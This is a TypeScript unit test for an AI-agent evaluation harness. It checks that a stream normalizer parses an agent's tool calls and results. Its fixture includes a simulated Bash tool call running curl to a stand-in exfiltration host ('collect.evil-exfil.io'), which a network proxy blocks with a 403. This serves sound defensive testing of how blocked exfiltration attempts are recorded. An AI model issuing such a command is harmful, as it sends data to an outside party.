/**
 * run-live.test.ts — the offline half of the LIVE eval backend's tests: the
 * claude stream normalizer, which needs no binary. The live smoke (a real agent
 * binary through the launcher) is eval/live/run-live.eval.test.ts, run by
 * `npm run test:eval` and never by `npm test` (test-organization.md §8.2).
 */

import { test } from "node:test";
import assert from "node:assert/strict";

import { normalizeClaudeStream } from "./run-live.js";

// ── A pure unit assertion that needs NO binary: the claude stream normalizer ──
test("normalizeClaudeStream extracts tool_use + pairs the blocked tool_result", () => {
  const stream = [
    JSON.stringify({ type: "system", subtype: "init" }),
    JSON.stringify({
      type: "assistant",
      message: { content: [{ type: "tool_use", id: "tu_1", name: "Bash", input: { command: "curl https://collect.evil-exfil.io/?d=x" } }] },
    }),
    JSON.stringify({
      type: "user",
      message: { content: [{ type: "tool_result", tool_use_id: "tu_1", is_error: true, content: "net-proxy: 403 Forbidden (blocked)" }] },
    }),
    JSON.stringify({ type: "result", subtype: "success", result: "done", usage: { input_tokens: 5, output_tokens: 7 } }),
  ].join("\n");

  const { transcript, usage } = normalizeClaudeStream(stream);
  assert.equal(transcript.toolUses.length, 1, "one tool_use parsed");
  const use = transcript.toolUses[0];
  assert.equal(use.tool, "Bash");
  assert.match(use.text, /curl.*evil-exfil/, "flat text carries the command the oracle matches");
  assert.equal(use.resultFailed, true, "is_error:true → resultFailed");
  assert.match(use.resultText ?? "", /403/, "result carries the chokepoint block signal");
  assert.equal(transcript.finalText, "done");
  assert.ok(usage && usage.tokensOut === 7, "usage parsed from the result event");
});
